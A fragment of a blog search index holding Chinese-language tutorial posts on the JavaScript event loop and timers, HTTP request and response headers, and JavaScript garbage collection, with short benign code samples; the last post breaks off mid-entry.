      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js运行机制</title>
      <link href="/2018/08/29/js%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/"/>
      <url>/2018/08/29/js%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="JS的单线程"><a href="#JS的单线程" class="headerlink" title="JS的单线程"></a>JS的单线程</h2><p>JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。<br>JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？<br>所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。<br>为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。</p><h2 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h2><p>单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。<br>如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。<br>JavaScript语言的设计者意识到，这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。<br>于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。<br>具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）</p><blockquote><p>（1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。<br>（2）主线程之外，还存在一个”任务队列”（task queue）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件。<br>（3）一旦”执行栈”中的所有同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。<br>（4）主线程不断重复上面的第三步。</p></blockquote><p>下图就是主线程和任务队列的示意图<br><img src="http://www.ruanyifeng.com/blogimg/asset/2014/bg2014100801.jpg" alt="主线程与任务队列"></p><p>只要主线程空了，就会去读取”任务队列”，这就是JavaScript的运行机制。这个过程会不断重复。</p><h2 id="事件和回调函数"><a href="#事件和回调函数" class="headerlink" title="事件和回调函数"></a>事件和回调函数</h2><p>“任务队列”是一个事件的队列（也可以理解成消息的队列），IO设备完成一项任务，就在”任务队列”中添加一个事件，表示相关的异步任务可以进入”执行栈”了。主线程读取”任务队列”，就是读取里面有哪些事件。<br>“任务队列”中的事件，除了IO设备的事件以外，还包括一些用户产生的事件（比如鼠标点击、页面滚动等等）。只要指定过回调函数，这些事件发生时就会进入”任务队列”，等待主线程读取。<br>所谓”回调函数”（callback），就是那些会被主线程挂起来的代码。异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。<br>“任务队列”是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，”任务队列”上第一位的事件就自动进入主线程。但是，由于存在后文提到的”定时器”功能，主线程首先要检查一下执行时间，某些事件只有到了规定的时间，才能返回主线程。</p><h2 id="Event-Loop"><a href="#Event-Loop" class="headerlink" title="Event Loop"></a>Event Loop</h2><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）。<br><img src="http://www.ruanyifeng.com/blogimg/asset/2014/bg2014100802.png" alt="Event Loop"></p><p>上图中，主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码调用各种外部API，它们在”任务队列”中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取”任务队列”，依次执行那些事件所对应的回调函数。<br>执行栈中的代码（同步任务），总是在读取”任务队列”（异步任务）之前执行。请看下面这个例子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var req = new XMLHttpRequest();<br>req.open(<span class="hljs-string">'GET'</span>, url);    <br>req.onload = <span class="hljs-function"><span class="hljs-title">function</span></span> ()&#123;&#125;;    <br>req.onerror = <span class="hljs-function"><span class="hljs-title">function</span></span> ()&#123;&#125;;    <br>req.send();<br></code></pre></td></tr></table></figure><p>上面代码中的req.send方法是Ajax操作向服务器发送数据，它是一个异步任务，意味着只有当前脚本的所有代码执行完，系统才会去读取”任务队列”。所以，它与下面的写法等价。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">var req = new XMLHttpRequest();<br>req.open(<span class="hljs-string">'GET'</span>,url);<br>req.send;<br>req.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;&#125;;<br>req.onerror = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;&#125;;<br></code></pre></td></tr></table></figure><p>也就是说，指定回调函数的部分（onload和onerror），在send()方法的前面或后面无关紧要，因为它们属于执行栈的一部分，系统总是执行完它们，才会去读取”任务队列”。</p><h2 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h2><p>除了放置异步任务的事件，”任务队列”还可以放置定时事件，即指定某些代码在多少时间之后执行。这叫做”定时器”（timer）功能，也就是定时执行的代码。<br>定时器功能主要由setTimeout()和setInterval()这两个函数来完成，它们的内部运行机制完全一样，区别在于前者指定的代码是一次性执行，后者则为反复执行。以下主要讨论setTimeout()。<br>setTimeout()接受两个参数，第一个是回调函数，第二个是推迟执行的毫秒数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">console.log(1);<br>setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;conosle.log(2);&#125;,1000);<br>console.log(3);<br></code></pre></td></tr></table></figure><p>上面代码的执行结果是1，3，2，因为setTimeout()将第二行推迟到1000毫秒之后执行。<br>如果将setTimeout()的第二个参数设为0，就表示当前代码执行完（执行栈清空）以后，立即执行（0毫秒间隔）指定的回调函数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">setTimeout(<span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;console.log(1)&#125;,0);<br>console.log(2);<br></code></pre></td></tr></table></figure><p>上面代码的执行结果总是2，1，因为只有在执行完第二行以后，系统才会去执行”任务队列”中的回调函数。<br>总之，setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，也就是说，尽可能早得执行。它在”任务队列”的尾部添加一个事件，因此要等到同步任务和”任务队列”现有的事件都处理完，才会得到执行。<br>HTML5标准规定了setTimeout()的第二个参数的最小值（最短间隔），不得低于4毫秒，如果低于这个值，就会自动增加。在此之前，老版本的浏览器都将最短间隔设为10毫秒。另外，对于那些DOM的变动（尤其是涉及页面重新渲染的部分），通常不会立即执行，而是每16毫秒执行一次。这时使用requestAnimationFrame()的效果要好于setTimeout()。<br>需要注意的是，setTimeout()只是将事件插入了”任务队列”，必须等到当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。要是当前代码耗时很长，有可能要等很久，所以并没有办法保证，回调函数一定会在setTimeout()指定的时间执行。</p><h2 id="Node-js的Event-Loop"><a href="#Node-js的Event-Loop" class="headerlink" title="Node.js的Event Loop"></a>Node.js的Event Loop</h2><p>Node.js也是单线程的Event Loop，但是它的运行机制不同于浏览器环境。</p><p><img src="http://www.ruanyifeng.com/blogimg/asset/2014/bg2014100803.png" alt="node的事件循环"><br>根据上图，Node.js的运行机制如下。</p><blockquote><p>（1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p></blockquote><p>除了setTimeout和setInterval这两个方法，Node.js还提供了另外两个与”任务队列”有关的方法：process.nextTick和setImmediate。它们可以帮助我们加深对”任务队列”的理解。<br>process.nextTick方法可以在当前”执行栈”的尾部—-下一次Event Loop（主线程读取”任务队列”）之前—-触发回调函数。也就是说，它指定的任务总是发生在所有异步任务之前。setImmediate方法则是在当前”任务队列”的尾部添加事件，也就是说，它指定的任务总是在下一次Event Loop时执行，这与setTimeout(fn, 0)很像。请看下面的例子（via StackOverflow）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">process.nextTick(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">A</span></span>() &#123;<br>  console.log(1);<br>  process.nextTick(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">B</span></span>()&#123;console.log(2);&#125;);<br>&#125;);<br><br>setTimeout(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">timeout</span></span>() &#123;<br>  console.log(<span class="hljs-string">'TIMEOUT FIRED'</span>);<br>&#125;, 0)<br>// 1<br>// 2<br>// TIMEOUT FIRED<br></code></pre></td></tr></table></figure><p>上面代码中，由于process.nextTick方法指定的回调函数，总是在当前”执行栈”的尾部触发，所以不仅函数A比setTimeout指定的回调函数timeout先执行，而且函数B也比timeout先执行。这说明，如果有多个process.nextTick语句（不管它们是否嵌套），将全部在当前”执行栈”执行。<br>现在，再看setImmediate。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">setImmediate(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">A</span></span>()&#123;<br>    console.log(1);<br>    setImmediate(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">B</span></span>()&#123;console.log(2);&#125;);<br>&#125;);<br>setTimeout(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">timeout</span></span>()&#123;<br>    console.log(3);<br>&#125;,0);<br></code></pre></td></tr></table></figure><p>上面代码中，setImmediate与setTimeout(fn,0)各自添加了一个回调函数A和timeout，都是在下一次Event Loop触发。那么，哪个回调函数先执行呢？答案是不确定。运行结果可能是1–TIMEOUT FIRED–2，也可能是TIMEOUT FIRED–1–2。<br>令人困惑的是，Node.js文档中称，setImmediate指定的回调函数，总是排在setTimeout前面。实际上，这种情况只发生在递归调用的时候。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">setImmediate(<span class="hljs-function"><span class="hljs-title">function</span></span> ()&#123;<br>  setImmediate(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">A</span></span>() &#123;<br>    console.log(1);<br>    setImmediate(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">B</span></span>()&#123;console.log(2);&#125;);<br>  &#125;);<br><br>  setTimeout(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">timeout</span></span>() &#123;<br>    console.log(<span class="hljs-string">'TIMEOUT FIRED'</span>);<br>  &#125;, 0);<br>&#125;);<br>// 1<br>// TIMEOUT FIRED<br>// 2<br></code></pre></td></tr></table></figure><p>上面代码中，setImmediate和setTimeout被封装在一个setImmediate里面，它的运行结果总是1–TIMEOUT FIRED–2，这时函数A一定在timeout前面触发。至于2排在TIMEOUT FIRED的后面（即函数B在timeout后面触发），是因为setImmediate总是将事件注册到下一轮Event Loop，所以函数A和timeout是在同一轮Loop执行，而函数B在下一轮Loop执行。<br>我们由此得到了process.nextTick和setImmediate的一个重要区别：多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。事实上，这正是Node.js 10.0版添加setImmediate方法的原因，否则像下面这样的递归调用process.nextTick，将会没完没了，主线程根本不会去读取”事件队列”！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">process.nextTick(<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">foo</span></span>() &#123;<br>  process.nextTick(foo);<br>&#125;);<br></code></pre></td></tr></table></figure><p>事实上，现在要是你写出递归的process.nextTick，Node.js会抛出一个警告，要求你改成setImmediate。<br>另外，由于process.nextTick指定的回调函数是在本次”事件循环”触发，而setImmediate指定的是在下次”事件循环”触发，所以很显然，前者总是比后者发生得早，而且执行效率也高（因为不用检查”任务队列”）。</p>]]></content>
      
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http头部信息详解</title>
      <link href="/2018/08/29/http%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E8%AF%A6%E8%A7%A3/"/>
      <url>/2018/08/29/http%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>[相关连接]<a href="https://blog.csdn.net/guoxinjie17/article/details/80348964" target="_blank" rel="noopener">https://blog.csdn.net/guoxinjie17/article/details/80348964</a><br>Content-Type类型：<a href="https://blog.csdn.net/wahaha13168/article/details/81236090" target="_blank" rel="noopener">https://blog.csdn.net/wahaha13168/article/details/81236090</a></p><h2 id="Request-Headers"><a href="#Request-Headers" class="headerlink" title="Request Headers"></a>Request Headers</h2><p><img src="http://upload-images.jianshu.io/upload_images/1996162-ccc7d924e1eb5184?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h3 id="Accept"><a href="#Accept" class="headerlink" title="Accept:"></a>Accept:</h3><blockquote><p>作用： 浏览器端可以接受的媒体类型,<br>例如： Accept: text/html 代表浏览器可以接受服务器回发的类型为 text/html 也就是我们常说的html文档,如果服务器无法返回text/html类型的数据,服务器应该返回一个406错误(non acceptable)</p></blockquote><h3 id="通配符-代表任意类型"><a href="#通配符-代表任意类型" class="headerlink" title="通配符*代表任意类型"></a>通配符*代表任意类型</h3><blockquote><p>例如Accept:/代表浏览器可以处理所有类型（一般浏览器发给服务器都是发这个）</p></blockquote><h3 id="Accept-Encoding"><a href="#Accept-Encoding" class="headerlink" title="Accept-Encoding:"></a>Accept-Encoding:</h3><blockquote><p>作用： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate），（注意：这不是只字符编码）;<br>例如： Accept-Encoding: zh-CN,zh;q=0.8</p></blockquote><h3 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h3><blockquote><p>作用： 浏览器申明自己接收的语言。<br>语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等；<br>例如： Accept-Language: en-us</p></blockquote><h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><blockquote><p>例如：　Connection: keep-alive 当一个网页打开完成后，客户端和服务器之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接<br>例如： Connection: close 代表一个Request完成后，客户端和服务器之间用于传输HTTP数据的TCP连接会关闭， 当客户端再次发送Request，需要重新建立TCP连接。</p></blockquote><h3 id="Host-发送请求时，该报头域是必须的"><a href="#Host-发送请求时，该报头域是必须的" class="headerlink" title="Host(发送请求时，该报头域是必须的)"></a>Host(发送请求时，该报头域是必须的)</h3><blockquote><p>作用: 请求报头域主要用于指定被请求资源的Internet主机和端口号，它通常从HTTP URL中提取出来的<br>例如: 我们在浏览器中输入：<a href="http://www.hzau.edu.cn" target="_blank" rel="noopener">http://www.hzau.edu.cn</a><br>浏览器发送的请求消息中，就会包含Host请求报头域，如下：Host：<a href="http://www.hzau.edu.cn" target="_blank" rel="noopener">www.hzau.edu.cn</a> 此处使用缺省端口号80，若指定了端口号，则变成：Host：指定端口号</p></blockquote><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><blockquote><p>当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</p></blockquote><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><blockquote><p>作用：告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本.<br>我们上网登陆论坛的时候，往往会看到一些欢迎信息，其中列出了你的操作系统的名称和版本，你所使用的浏览器的名称和版本，这往往让很多人感到很神奇，实际上，服务器应用程序就是从User-Agent这个请求报头域中获取到这些信息User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。<br>例如： User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; CIBA; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; InfoPath.2; .NET4.0E)</p></blockquote><hr><p><img src="http://upload-images.jianshu.io/upload_images/1996162-85f940d116d228a5?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><h3 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h3><blockquote><p>Cache-Control与Expires的作用一致，都是指明当前资源的有效期，控制浏览器是否直接从浏览器缓存取数据还是重新发请求到服务器取数据。只不过Cache-Control的选择更多，设置更细致，如果同时设置的话，其优先级高于Expires。我们网页的缓存控制是由HTTP头中的“Cache-control”来实现的，常见值有private、no-cache、max-age、must-revalidate等，默认为private。这几种值的作用是根据重新查看某一页面时不同的方式来区分的：</p></blockquote><ol><li>打开新窗口<br>值为private、no-cache、must-revalidate，那么打开新窗口访问时都会重新访问服务器。而如果指定了max-age值（单位为秒），那么在此值内的时间里就不会重新访问服务器，例如：</li></ol><p>Cache-control: max-age=5(表示当访问此网页后的5秒内再次访问不会去服务器)</p><ol start="2"><li>在地址栏回车<br>值为private或must-revalidate则只有第一次访问时会访问服务器，以后就不再访问。</li></ol><p>值为no-cache，那么每次都会访问。</p><p>值为max-age，则在过期之前不会重复访问。</p><ol start="3"><li>按后退按钮<br>值为private、must-revalidate、max-age，则不会重访问，</li></ol><p>值为no-cache，则每次都重复访问</p><ol start="4"><li>按刷新按钮<br>无论为何值，都会重复访问</li></ol><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><blockquote><p>Cookie是用来存储一些用户信息以便让服务器辨别用户身份的（大多数需要登录的网站上面会比较常见），比如cookie会存储一些用户的用户名和密码，当用户登录后就会在客户端产生一个cookie来存储相关信息，这样浏览器通过读取cookie的信息去服务器上验证并通过后会判定你是合法用户，从而允许查看相应网页。当然cookie里面的数据不仅仅是上述范围，还有很多信息可以存储是cookie里面，比如sessionid等。</p></blockquote><h3 id="if-Modified-Since"><a href="#if-Modified-Since" class="headerlink" title="if-Modified-Since"></a>if-Modified-Since</h3><blockquote><p>作用： 把浏览器端缓存页面的最后修改时间发送到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行对比。如果时间一致，那么返回304，客户端就直接使用本地缓存文件。如果时间不一致，就会返回200和新的文件内容。客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示在浏览器中.<br>例如：Mon, 17 Aug 2015 12:03:33 GMT</p></blockquote><h3 id="if-None-Match"><a href="#if-None-Match" class="headerlink" title="if-None-Match"></a>if-None-Match</h3><blockquote><p>作用: If-None-Match和ETag一起工作，工作原理是在HTTP Response中添加ETag信息。 当用户再次请求该资源时，将在HTTP Request 中加入If-None-Match信息(ETag的值)。如果服务器验证资源的ETag没有改变（该资源没有更新），将返回一个304状态告诉客户端使用本地缓存文件。否则将返回200状态和新的资源和Etag. 使用这样的机制将提高网站的性能<br>例如: If-None-Match: W/”3119-1437038474000”</p></blockquote><hr><h2 id="Response-Header"><a href="#Response-Header" class="headerlink" title="Response Header"></a>Response Header</h2><h3 id="Allow"><a href="#Allow" class="headerlink" title="Allow"></a>Allow</h3><blockquote><p>服务器支持哪些请求方法（如GET、POST等）；</p></blockquote><h3 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h3><blockquote><p>文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面；</p></blockquote><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><blockquote><p>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容；</p></blockquote><h3 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h3><blockquote><p>表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentTyep。 可在web.xml文件中配置扩展名和MIME类型的对应关系；</p></blockquote><h3 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h3><blockquote><p>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦；</p></blockquote><h3 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h3><blockquote><p>指明应该在什么时候认为文档已经过期，从而不再缓存它。</p></blockquote><h3 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h3><blockquote><p>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置；</p></blockquote><h3 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h3><blockquote><p>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302；</p></blockquote><h3 id="Refresh"><a href="#Refresh" class="headerlink" title="Refresh"></a>Refresh</h3><blockquote><p>表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader (“Refresh”, “5; URL=http:/host/path” )让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的 &lt;META HTTP-EQUIV=”Refresh” CONTENT=”5;URL=http ://host/path”/ &gt;实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是<meta http-equiv="Refresh" ...>。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</p></blockquote><p><img src="https://img-blog.csdn.net/20160809141143516" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS的垃圾回收机制和内存分配</title>
      <link href="/2018/08/20/JS%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%92%8C%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/"/>
      <url>/2018/08/20/JS%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%92%8C%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="1-JS的垃圾回收机制"><a href="#1-JS的垃圾回收机制" class="headerlink" title="1.JS的垃圾回收机制"></a>1.JS的垃圾回收机制</h2><p>JS解释器和C#，java的运行环境一样有垃圾回收机制，程序员不需要手动跟踪释放内存。</p><h3 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h3><p>就是释放那些不再使用的变量。什么是不再使用？就是生命周期结束的变量，可能是全局的和局部的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">A</span></span>()&#123;<br> var i = &#123;name:<span class="hljs-string">'qiqi'</span>&#125;;<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">B</span></span>()&#123;<br>   var i = &#123;name:<span class="hljs-string">'qiqi'</span>&#125;;<br>   <span class="hljs-built_in">return</span> i;<br>&#125;<br>var n = A();<br>var m =B();<br></code></pre></td></tr></table></figure><h3 id="垃圾回收的方式"><a href="#垃圾回收的方式" class="headerlink" title="垃圾回收的方式"></a>垃圾回收的方式</h3><ol><li><p>标记清除:<br>垃圾回收器会在运行的时候给存储在内存中的所有变量加上标记，然后去掉环境中的变量以及被环境中变量所引用的变量（闭包），在这些完成之后仍存在标记的就是要删除的变量了，因为环境中的变量已经无法访问到这些变量了，然后垃圾回收器相会这些带有标记的变量机器所占空间。至于怎么标记有很多种方式，比如特殊位的反转、维护一个列表等，这些并不重要。</p></li><li><p>引用计数：<br>在低版本IE中经常会出现内存泄露，很多时候就是因为其采用引用计数方式进行垃圾回收。引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。为什么很少有浏览器采用，还会带来内存泄露问题呢？主要是因为这种方式没办法解决循环引用问题。</p></li></ol><h2 id="2-JS的内存分配"><a href="#2-JS的内存分配" class="headerlink" title="2.JS的内存分配"></a>2.JS的内存分配</h2><p>javascript中的变量分为两种，原始值和引用值。原始值指的是原始数据类型的值，比如undefined,null,number,string,boolean类型所表示的值。引用值指的是复合数据类型的值，即Object,Function,Array等。</p><p>原始值和引用值存储在内存中的位置分别为栈和堆。原始值是存储在栈中的简单数据段，他们的值直接存储在变量访问的位置。引用值是存储在堆中的对象。</p><p>存储在栈中的值是一个指针，指向存储在堆中的实际对象。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> Person(id,name,age)&#123; <br>this.id = id; <br>this.name = name; <br>this.age = age; <br>var num = 10; <br>var bol = <span class="hljs-literal">true</span>; <br>var str = <span class="hljs-string">"abc"</span>; <br>var obj = new Object(); <br>var arr = [<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>]; <br>var person = new Person(100,<span class="hljs-string">"jxl"</span>,22);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20160708114641388?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" 